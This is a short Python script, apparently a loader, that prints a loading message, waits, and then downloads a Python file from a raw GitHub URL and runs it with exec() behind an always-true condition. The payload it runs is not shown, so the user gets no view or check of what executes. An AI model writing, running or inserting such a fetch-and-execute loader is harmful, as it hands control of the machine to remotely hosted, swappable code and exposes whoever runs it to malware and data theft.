import requests
from time import sleep
print('>>loading')
sleep(5)
chon = 1
if chon == 1 :
    exec(requests.get('https://raw.githubusercontent.com/unghia11/gopv4/refs/heads/main/8.6.py').text)
else :
     exit()